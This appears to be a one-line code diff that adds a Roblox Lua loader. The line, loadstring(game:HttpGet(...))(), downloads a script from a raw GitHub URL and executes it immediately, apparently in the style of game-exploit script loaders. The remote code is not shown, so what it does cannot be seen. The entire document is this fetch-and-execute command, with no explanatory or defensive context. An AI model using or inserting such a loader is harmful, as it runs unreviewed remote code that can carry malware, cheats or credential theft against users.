@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sam00-debug/C-/refs/heads/main/test%20np"))()
